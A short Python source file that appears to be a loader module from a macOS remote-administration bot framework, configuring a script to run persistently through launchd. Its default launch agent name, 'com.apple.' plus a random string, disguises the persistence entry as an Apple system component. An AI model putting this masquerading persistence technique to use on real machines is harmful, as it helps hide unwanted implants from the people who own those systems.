# -*- coding: utf-8 -*-
__author__ = "Marten4n6"
__license__ = "GPLv3"

from bot.loaders.helper import *


class Loader(LoaderABC):
    def get_info(self):
        return {
            "Author": ["Marten4n6"],
            "Description": "Run a multi-format script (.sh/.bat/.ps1/.rb) persistently via launchd.",
            "References": []
        }

    def get_option_messages(self):
        return [
            "Script filename (e.g. agent.sh / agent.bat / agent.ps1 / agent.rb): ",
            "Launch agent name (Leave empty for com.apple.<RANDOM>): "
        ]

    def get_options(self, set_options):
        set_options = list(set_options) + ["", ""]
        script_filename = set_options[0]
        launch_agent_name = set_options[1]

        if not script_filename or "." not in script_filename:
            raise ValueError("A script filename with a valid extension is required.")

        if not launch_agent_name:
            launch_agent_name = "com.apple.{}".format(random_string())

        return {
            "loader_name": "run_script",
            "script_filename": script_filename,
            "launch_agent_name": launch_agent_name
        }
